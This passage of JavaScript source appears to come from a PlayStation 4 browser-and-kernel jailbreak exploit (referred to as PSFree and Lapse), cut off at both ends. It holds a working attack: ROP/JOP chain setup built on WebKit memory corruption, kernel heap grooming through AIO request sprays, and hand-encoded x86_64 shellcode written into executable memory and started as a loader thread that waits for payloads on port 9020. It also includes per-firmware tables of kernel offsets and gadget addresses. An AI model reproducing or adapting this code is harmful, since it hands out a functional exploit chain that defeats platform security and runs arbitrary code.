  init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
  init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
  init_syscall_array(syscall_array, libkernel_base, 300 * KB);
  if ((config_target >= 0x700) && (config_target < 0x900)) {
    var gs = Object.getOwnPropertyDescriptor(window, "location").set;
    // JSCustomGetterSetter.m_getterSetter
    gs = mem.addrof(gs).readp(0x28);
    // sizeof JSC::CustomGetterSetter
    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    // JSC::CustomGetterSetter.m_setter
    gc_buf.write64(0x10, get_gadget(gadgets, jop8));
    const proto = Chain.prototype;
    // _rop must have a descriptor initially in order for the structure to pass
    // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
    // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
    // checks for any descriptor to run
    //
    // the butterfly's indexing type must be something the GC won't inspect
    // like DoubleShape. it will be used to store the JOP table's pointer
    const _rop = {
      get launch() {
        throw Error("never call");
      },
      0: 1.1,
    };
    // replace .launch with the actual custom getter/setter
    mem.addrof(_rop).write64(off_js_inline_prop, gc_buf);
    proto._rop = _rop;
    // JOP table
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    proto._rax_ptrs = rax_ptrs;
    rw_write64(rax_ptrs, 0x70, get_gadget(gadgets, jop9));
    rw_write64(rax_ptrs, 0x30, get_gadget(gadgets, jop10));
    rw_write64(rax_ptrs, 0x40, get_gadget(gadgets, jop6));
    rw_write64(rax_ptrs, 0x00, get_gadget(gadgets, jop7));
    const jop_buffer_p = mem.addrof(_rop).readp(off_js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);
    const empty = {};
    const off_js_cell = 0;
    proto._empty_cell = mem.addrof(empty).read64(off_js_cell);
  }
  //log('syscall_array:');
  //log(syscall_array);
  Chain.init_class(gadgets, syscall_array);
}

function ViewMixin(superclass) {
  const res = class extends superclass {
    constructor(...args) {
      super(...args);
      this.buffer;
    }
    get addr() {
      var res = this._addr_cache;
      if (res !== undefined) {
        return res;
      }
      res = get_view_vector(this);
      this._addr_cache = res;
      return res;
    }
    get size() {
      return this.byteLength;
    }
    addr_at(index) {
      const size = this.BYTES_PER_ELEMENT;
      return this.addr.add(index * size);
    }
    sget(index) {
      return this[index] | 0;
    }
  };
  // workaround for known affected versions: ps4 [6.00, 10.00)
  // see from() and of() from
  // WebKit/Source/JavaScriptCore/builtins/TypedArrayConstructor.js at PS4
  // 8.0x
  // @getByIdDirectPrivate(this, "allocateTypedArray") will fail when "this"
  // isn't one of the built-in TypedArrays. this is a violation of the
  // ECMAScript spec at that time
  // TODO assumes ps4, support ps5 as well
  // FIXME define the from/of workaround functions once
  res.from = function from(...args) {
    const base = this.__proto__;
    return new this(base.from(...args).buffer);
  };
  res.of = function of(...args) {
    const base = this.__proto__;
    return new this(base.of(...args).buffer);
  };
  return res;
}
class View1 extends ViewMixin(Uint8Array) {}
class View2 extends ViewMixin(Uint16Array) {}
class View4 extends ViewMixin(Uint32Array) {}
class Buffer extends BufferView {
  get addr() {
    var res = this._addr_cache;
    if (res !== undefined) {
      return res;
    }
    res = get_view_vector(this);
    this._addr_cache = res;
    return res;
  }
  get size() {
    return this.byteLength;
  }
  addr_at(index) {
    return this.addr.add(index);
  }
}
// see from() and of() comment above
Buffer.from = function from(...args) {
  const base = this.__proto__;
  return new this(base.from(...args).buffer);
};
Buffer.of = function of(...args) {
  const base = this.__proto__;
  return new this(base.of(...args).buffer);
};
const VariableMixin = superclass => class extends superclass {
  constructor(value=0) {
    // unlike the View classes, we don't allow number coercion. we
    // explicitly allow floats unlike Int
    if (typeof value !== 'number') {
      throw TypeError('value not a number');
    }
    super([value]);
  }
  addr_at(...args) {
    throw TypeError('unimplemented method');
  }
  [Symbol.toPrimitive](hint) {
    return this[0];
  }
  toString(...args) {
    return this[0].toString(...args);
  }
};
class Word extends VariableMixin(View4) {}
// mutable Int (we are explicitly using Int's private fields)
const Word64Mixin = superclass => class extends superclass {
  constructor(...args) {
    if (!args.length) {
      return super(0);
    }
    super(...args);
  }
  get addr() {
    // assume this is safe to cache
    return get_view_vector(this._u32);
  }
  get length() {
    return 1;
  }
  get size() {
    return 8;
  }
  get byteLength() {
    return 8;
  }
  // no setters for top and bot since low/high can accept negative integers
  get lo() {
    return super.lo;
  }
  set lo(value) {
    this._u32[0] = value;
  }
  get hi() {
    return super.hi;
  }
  set hi(value) {
    this._u32[1] = value;
  }
  set(value) {
    const buffer = this._u32;
    const values = lohi_from_one(value);
    buffer[0] = values[0];
    buffer[1] = values[1];
  }
};
class Long extends Word64Mixin(Int) {
  as_addr() {
    return new Addr(this);
  }
}
class Pointer extends Word64Mixin(Addr) {}
// create a char array like in the C language
// string to view since it's easier to get the address of the buffer this way
function cstr(str) {
  str += '\0';
  return View1.from(str, c => c.codePointAt(0));
}
// make a JavaScript string
function jstr(buffer) {
  var res = '';
  for (const item of buffer) {
    if (item === 0) {
      break;
    }
    res += String.fromCodePoint(item);
  }
  // convert to primitive string
  return String(res);
}

function get_rtprio() {
  if (rtprio === null) {
    rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
  }
  return rtprio;
}

function get_aio_errors_p() {
  if (_aio_errors === null) {
    _aio_errors = new View4(max_aio_ids);
  }
  if (_aio_errors_p === null) {
    _aio_errors_p = _aio_errors.addr;
  }
  return _aio_errors_p;
}
//================================================================================================
// LAPSE INIT FUNCTION ===========================================================================
//================================================================================================
async function lapse_init() {
  rop_init();
  chain = new Chain();
  init_gadget_map(gadgets, pthread_offsets, libkernel_base);
}

function sys_void(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.syscall_void(...args);
}

function sysi(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  return chain.sysi(...args);
}

function call_nze(...args) {
  if (chain === null) {
    throw Error('chain is not initialized. lapse_init() must be called first.');
  }
  const res = chain.call_int(...args);
  if (res !== 0) {
    die(`call(${args[0]}) returned nonzero: ${res}`);
  }
}
// #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
//
// #define SCE_KERNEL_AIO_STATE_SUBMITTED      1
// #define SCE_KERNEL_AIO_STATE_PROCESSING     2
// #define SCE_KERNEL_AIO_STATE_COMPLETED      3
// #define SCE_KERNEL_AIO_STATE_ABORTED        4
//
// typedef struct SceKernelAioResult {
//     // errno / SCE error code / number of bytes processed
//     int64_t returnValue;
//     // SCE_KERNEL_AIO_STATE_*
//     uint32_t state;
// } SceKernelAioResult;
//
// typedef struct SceKernelAioRWRequest {
//     off_t offset;
//     size_t nbyte;
//     void *buf;
//     struct SceKernelAioResult *result;
//     int fd;
// } SceKernelAioRWRequest;
//
// typedef int SceKernelAioSubmitId;
//
// // SceAIO submit commands
// #define SCE_KERNEL_AIO_CMD_READ     0x001
// #define SCE_KERNEL_AIO_CMD_WRITE    0x002
// #define SCE_KERNEL_AIO_CMD_MASK     0xfff
// // SceAIO submit command flags
// #define SCE_KERNEL_AIO_CMD_MULTI 0x1000
//
// #define SCE_KERNEL_AIO_PRIORITY_LOW     1
// #define SCE_KERNEL_AIO_PRIORITY_MID     2
// #define SCE_KERNEL_AIO_PRIORITY_HIGH    3
// int aio_submit_cmd(
//     u_int cmd,
//     SceKernelAioRWRequest reqs[],
//     u_int num_reqs,
//     u_int prio,
//     SceKernelAioSubmitId ids[]
// );
function aio_submit_cmd(cmd, requests, num_requests, handles) {
  sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}
// int aio_multi_delete(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[]
// );
function aio_multi_delete(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_delete', ids, num_ids, sce_errs);
}
// int aio_multi_poll(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_poll(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_poll', ids, num_ids, sce_errs);
}
// int aio_multi_cancel(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_cancel(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_cancel', ids, num_ids, sce_errs);
}
// // wait for all (AND) or atleast one (OR) to finish
// // DEFAULT is the same as AND
// #define SCE_KERNEL_AIO_WAIT_DEFAULT 0x00
// #define SCE_KERNEL_AIO_WAIT_AND     0x01
// #define SCE_KERNEL_AIO_WAIT_OR      0x02
//
// int aio_multi_wait(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[],
//     //SCE_KERNEL_AIO_WAIT_*
//     uint32_t mode,
//     useconds_t *timeout
// );
function aio_multi_wait(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
  const reqs1 = new Buffer(0x28 * num_reqs);
  for (var i = 0; i < num_reqs; i++) {
    // .fd = -1
    reqs1.write32(0x20 + i * 0x28, -1);
  }
  return reqs1;
}

function spray_aio(loops=1, reqs1_p, num_reqs, ids_p, multi=true, cmd=AIO_CMD_READ) {
  const step = 4 * (multi ? num_reqs : 1);
  cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
  for (var i = 0, idx = 0; i < loops; i++) {
    aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
    idx += step;
  }
}

function cancel_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    aio_multi_cancel(ids_p.add((bi << 2) * len), len);
  }
  if (rem) {
    aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
  }
}
//================================================================================================
// STAGE SETUP ===================================================================================
//================================================================================================
function setup(block_fd) {
  // this part will block the worker threads from processing entries so that
  // we may cancel them instead. this is to work around the fact that
  // aio_worker_entry2() will fdrop() the file associated with the aio_entry
  // on ps5. we want aio_multi_delete() to call fdrop()
  //log('block AIO');
  const reqs1 = new Buffer(0x28 * num_workers);
  const block_id = new Word();
  for (var i = 0; i < num_workers; i++) {
    reqs1.write32(8 + i * 0x28, 1);
    reqs1.write32(0x20 + i * 0x28, block_fd);
  }
  aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
  //log('heap grooming');
  // chosen to maximize the number of 0x80 malloc allocs per submission
  const num_reqs = 3;
  const num_grooms = 0x200;
  const groom_ids = new View4(num_grooms);
  const groom_ids_p = groom_ids.addr;
  const greqs = make_reqs1(num_reqs);
  // allocate enough so that we start allocating from a newly created slab
  spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
  cancel_aios(groom_ids_p, num_grooms);
  //log('Setup complete');
  return [block_id, groom_ids];
}
//================================================================================================
// Malloc ========================================================================================
//================================================================================================
// This function is a C-style 'malloc' (memory allocate) implementation
// for this low-level exploit environment.
// It allocates a raw memory buffer of 'sz' BYTES and returns a
// raw pointer to it, bypassing normal JavaScript memory management.
function malloc(sz) {
  // 1. Allocate a standard JavaScript Uint8Array.
  //    The total size is 'sz' bytes (the requested size) plus a
  //    0x10000 byte offset (which might be for metadata or alignment).
  var backing = new Uint8Array(0x10000 + sz);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is critical to prevent the JS engine from freeing this
  //    memory block. If it were freed, 'ptr' would become a "dangling pointer"
  //    and lead to a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic to "steal" the raw pointer from the JS object.
  //    - mem.addrof(backing): Gets the address of the JS 'backing' object.
  //    - .add(0x10): Moves to the internal offset (16 bytes) where the
  //      pointer to the raw data buffer is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. Attach the original JS 'backing' array itself as a property
  //    to the 'ptr' object.
  //    This is a convenience, bundling the raw pointer ('ptr') with a
  //    "safe" JS-based way ('ptr.backing') to access the same memory.
  ptr.backing = backing;
  // 5. Return the 'ptr' object, which now acts as a raw pointer
  //    to the newly allocated block of 'sz' bytes.
  return ptr;
}
//================================================================================================
// Malloc for 32-bit =============================================================================
//================================================================================================
// This function mimics the C-standard 'malloc' function but for a 32-bit
// aligned buffer. It allocates memory using a standard JS ArrayBuffer
// but returns a *raw pointer* to its internal data buffer.
function malloc32(sz) {
  // 1. Allocate a standard JavaScript byte array.
  //    'sz * 4' suggests 'sz' is the number of 32-bit (4-byte) elements.
  //    The large base size (0x10000) might be to ensure a specific 
  //    allocation type or to hold internal metadata for this "fake malloc".
  var backing = new Uint8Array(0x10000 + sz * 4);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is CRITICAL. It prevents the JS engine from freeing this
  //    memory block. If the 'backing' array was collected, 'ptr' would
  //    become a "dangling pointer" and cause a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic for getting the raw address.
  //    - mem.addrof(backing): Gets the memory address of the JS 'backing' object.
  //    - .add(0x10): Moves to the offset (16 bytes) where the internal
  //      data pointer (pointing to the raw buffer) is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's actual data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. This is a convenience. It attaches a 32-bit view of the *original*
  //    JS buffer (backing.buffer) as a property to the 'ptr' object.
  //    This bundles the raw pointer ('ptr') with a "safe" JS-based way
  //    to access the same memory ('ptr.backing').
  ptr.backing = new Uint32Array(backing.buffer);
  // 5. Return the 'ptr' object. This object now represents a raw
  //    pointer to the newly allocated and GC-protected memory.
  return ptr;
}
//================================================================================================
// Bin Loader ====================================================================================
//================================================================================================
function runBinLoader() {
  // 1. Allocate a large (0x300000 bytes) memory buffer for the *main* payload.
  //    It is marked as Readable, Writable, and Executable (RWX).
  //    This buffer will likely be passed AS AN ARGUMENT to the loader.
  var payload_buffer = chain.sysp('mmap', 0, 0x300000, (PROT_READ | PROT_WRITE | PROT_EXEC), MAP_ANON, -1, 0);
  // 2. Allocate a smaller (0x1000 bytes) buffer for the
  //    *loader shellcode itself* using the custom malloc32 helper.
  var payload_loader = malloc32(0x1000);
  // 3. Get the JS-accessible backing array for the loader buffer.
  var BLDR = payload_loader.backing;
  // 4. --- START OF SHELLCODE ---
  //    This is not JavaScript. This is raw x86_64 machine code, written
  //    as 32-bit integers (hex values), directly into the executable buffer.
  //    This code is the "BinLoader" itself.
  BLDR[0]  = 0x56415741; BLDR[1]  = 0x83485541; BLDR[2]  = 0x894818EC;
  BLDR[3]  = 0xC748243C; BLDR[4]  = 0x10082444; BLDR[5]  = 0x483C2302;
  BLDR[6]  = 0x102444C7; BLDR[7]  = 0x00000000; BLDR[8]  = 0x000002BF;
  BLDR[9]  = 0x0001BE00; BLDR[10] = 0xD2310000; BLDR[11] = 0x00009CE8;
  BLDR[12] = 0xC7894100; BLDR[13] = 0x8D48C789; BLDR[14] = 0xBA082474;
  BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8; BLDR[17] = 0xFF894400;
  BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800; BLDR[20] = 0x89440000;
  BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2; BLDR[23] = 0x89410000;
  BLDR[24] = 0x2C8B4CC6; BLDR[25] = 0x45C64124; BLDR[26] = 0x05EBC300;
  BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
  BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
  BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
  BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
  BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
  BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
  BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
  BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
  BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
  BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
  BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
  BLDR[60] = 0xC3050FCA;
  // --- END OF SHELLCODE ---
  // 5. Use the 'mprotect' system call to *explicitly* mark the
  //    'payload_loader' buffer as RWX (Readable, Writable, Executable).
  //    This is a "belt and suspenders" call to ensure the OS will
  //    allow the CPU to execute the shellcode we just wrote.
  chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
  // 6. Allocate memory for a pthread (thread) structure.
  var pthread = malloc(0x10);
  // 7. Lock the main payload buffer in memory to prevent it from
  //    being paged out to disk.
  sysi('mlock', payload_buffer, 0x300000);
  //    Create a new native thread.
  call_nze(
    'pthread_create',
    pthread, // Pointer to the thread structure
    0, // Thread attributes (default)
    payload_loader, // The START ROUTINE (entry point). This is the address of our shellcode.
    payload_buffer // The ARGUMENT to pass to the shellcode.
  );
  // Update stats
    if (typeof updateJbStats === "function"){
    updateJbStats(false, true);
  }
  sessionStorage.removeItem('binloader');
  sessionStorage.setItem('autoJbRetry', 'false');
  window.log("BinLoader is ready. Send a payload to port 9020 now", "green");
}
//================================================================================================
// Init LapseGlobal Variables ====================================================================
//================================================================================================
function Init_LapseGlobals() {
  // Verify mem is initialized (should be initialized by make_arw)
  if (mem === null) {
    window.log("ERROR: mem is not initialized. PSFree exploit may have failed.\nPlease refresh page and try again...", "red");
    return 0;
  }
  // Kernel offsets
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      off_kstr = 0x7f92cb;
      off_cpuid_to_pcpu = 0x212cd10;
      off_sysent_661 = 0x112d250;
      jmp_rsi = 0x6b192;
      //patch_elf_loc = "./kpatch700.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x256b0,
        'pthread_join': 0x27d00,
        'pthread_barrier_init': 0xa170,
        'pthread_barrier_wait': 0x1ee80,
        'pthread_barrier_destroy': 0xe2e0,
        'pthread_exit': 0x19fd0
      }));
      break;
    case 0x750:
      off_kstr = 0x79a92e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      //patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case 0x751:
    case 0x755:
      off_kstr = 0x79a96e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      //patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      off_kstr = 0x7edcff;
      off_cpuid_to_pcpu = 0x228e6b0;
      off_sysent_661 = 0x11040c0;
      jmp_rsi = 0xe629c;
      //patch_elf_loc = "./kpatch800.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25610,
        'pthread_join': 0x27c60,
        'pthread_barrier_init': 0xa0e0,
        'pthread_barrier_wait': 0x1ee00,
        'pthread_barrier_destroy': 0xe180,
        'pthread_exit': 0x19eb0
      }));
      break;
    case 0x850:
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      //patch_elf_loc = "./kpatch850.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d50,
        'pthread_barrier_init': 0x283c0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25310
      }));
      break;
    case 0x852:
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      //patch_elf_loc = "./kpatch850.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d60,
        'pthread_barrier_init': 0x283d0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25320
      }));
      break;
    case 0x900:
      off_kstr = 0x7f6f27;
      off_cpuid_to_pcpu = 0x21ef2a0;
      off_sysent_661 = 0x1107f00;
      jmp_rsi = 0x4c7ad;
      //patch_elf_loc = "./kpatch900.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case 0x903:
    case 0x904:
      off_kstr = 0x7f4ce7;
      off_cpuid_to_pcpu = 0x21eb2a0;
      off_sysent_661 = 0x1103f00;
      jmp_rsi = 0x5325b;
      //patch_elf_loc = "./kpatch903.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      off_kstr = 0x769a88;
      off_cpuid_to_pcpu = 0x21a66c0;
      off_sysent_661 = 0x1100ee0;
      jmp_rsi = 0x15a6d;
      //patch_elf_loc = "./kpatch950.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x1c540,
        'pthread_join': 0x9560,
        'pthread_barrier_init': 0x24200,
        'pthread_barrier_wait': 0x1efb0,
        'pthread_barrier_destroy': 0x19450,
        'pthread_exit': 0x28ca0
      }));
      break;
    default:
      throw "Unsupported firmware";
  }
  // ROP offsets
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      off_ta_vt = 0x23ba070;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ad0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x50a00;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001fa68, // `58 c3`
        "pop rbx; ret": 0x0000000000028cfa, // `5b c3`
        "pop rcx; ret": 0x0000000000026afb, // `59 c3`
        "pop rdx; ret": 0x0000000000052b23, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c987, // `5e c3`
        "pop rdi; ret": 0x000000000000835d, // `5f c3`
        "pop rsp; ret": 0x0000000000078c62, // `5c c3`
        "pop r8; ret": 0x00000000005f5500, // `41 58 c3`
        "pop r9; ret": 0x00000000005c6a81, // `47 59 c3`
        "pop r10; ret": 0x0000000000061671, // `47 5a c3`
        "pop r11; ret": 0x0000000000d4344f, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da462c, // `41 5c c3`
        "pop r13; ret": 0x00000000019daaeb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c986, // `41 5e c3`
        "pop r15; ret": 0x000000000024be8c, // `41 5f c3`
      
        "ret": 0x000000000000003c, // `c3`
        "leave; ret": 0x00000000000f2c93, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e852, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x00000000000203e9, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000020148, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000294dcc, // `89 30 c3`
      
        [jop8]: 0x00000000019c2500, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000007776e0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f84031, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001e25cce, // `52 ff 20`
        [jop7]: 0x0000000000078c62, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x277c4, "setcontext": 0x2bc18 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x161f0 }));
      Chain = Chain700_852;
      break;
    case 0x750:
    case 0x751:
    case 0x755:
      off_ta_vt = 0x23ae2b0;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ac0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x4f580;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000003650b, // `58 c3`
        "pop rbx; ret": 0x0000000000015d5c, // `5b c3`
        "pop rcx; ret": 0x000000000002691b, // `59 c3`
        "pop rdx; ret": 0x0000000000061d52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c827, // `5e c3`
        "pop rdi; ret": 0x000000000024d2b0, // `5f c3`
        "pop rsp; ret": 0x000000000005f959, // `5c c3`
        "pop r8; ret": 0x00000000005f99e0, // `41 58 c3`
        "pop r9; ret": 0x000000000070439f, // `47 59 c3`
        "pop r10; ret": 0x0000000000061d51, // `47 5a c3`
        "pop r11; ret": 0x0000000000d492bf, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da945c, // `41 5c c3`
        "pop r13; ret": 0x00000000019ccebb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c826, // `41 5e c3`
        "pop r15; ret": 0x000000000024d2af, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000025654b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e592, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005becb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000201c4, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002951bc, // `89 30 c3`
      
        [jop8]: 0x00000000019b4c80, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000077b420, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f87995, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001f1c866, // `52 ff 20`
        [jop7]: 0x000000000005f959, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25f34, "setcontext": 0x2a388 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x16220 }));
      Chain = Chain700_852;
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x12a30;
      off_wk_strlen = 0x918;
      off_strlen = 0x4eb80;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000035a1b, // `58 c3`
        "pop rbx; ret": 0x000000000001537c, // `5b c3`
        "pop rcx; ret": 0x0000000000025ecb, // `59 c3`
        "pop rdx; ret": 0x0000000000060f52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003bd77, // `5e c3`
        "pop rdi; ret": 0x00000000001e3f87, // `5f c3`
        "pop rsp; ret": 0x00000000000bf669, // `5c c3`
        "pop r8; ret": 0x00000000005ee860, // `41 58 c3`
        "pop r9; ret": 0x00000000006f501f, // `47 59 c3`
        "pop r10; ret": 0x0000000000060f51, // `47 5a c3`
        "pop r11; ret": 0x00000000013cad93, // `41 5b c3`
        "pop r12; ret": 0x0000000000d8968d, // `41 5c c3`
        "pop r13; ret": 0x00000000019a0edb, // `41 5d c3`
        "pop r14; ret": 0x000000000003bd76, // `41 5e c3`
        "pop r15; ret": 0x00000000002499df, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000291fd7, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002dc62, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005b1bb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000001f864, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002915bc, // `89 30 c3`
      
        [jop8]: 0x0000000001988320, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000076b970, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f62f95, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001ef0d16, // `52 ff 20`
        [jop7]: 0x00000000000bf669, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x258f4, "setcontext": 0x29c58 }));
